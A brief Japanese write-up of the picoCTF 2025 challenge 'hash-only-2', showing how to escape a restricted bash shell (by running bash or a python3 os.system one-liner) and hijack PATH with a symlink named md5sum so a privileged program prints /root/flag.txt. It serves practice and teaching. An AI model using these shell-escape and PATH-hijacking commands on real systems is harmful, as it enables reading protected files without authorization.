# picoCTF2025　hash-only-2

中身のファイルは hash-only-1と一緒

ただしPATH書き換えができなくなっている

rbash（特定の操作だけできるbash）なので、bashに変更する。今回はbashが使えるのでそれを使った

```
$ bash
$ export PATH=".:$PATH"
$ ln -s /usr/bin/cat md5sum
$ flaghasher
Computing the MD5 hash of /root/flag.txt.... 
```
python3を使ってもよい
```
python3 -c 'import os; os.system("/bin/bash")'
```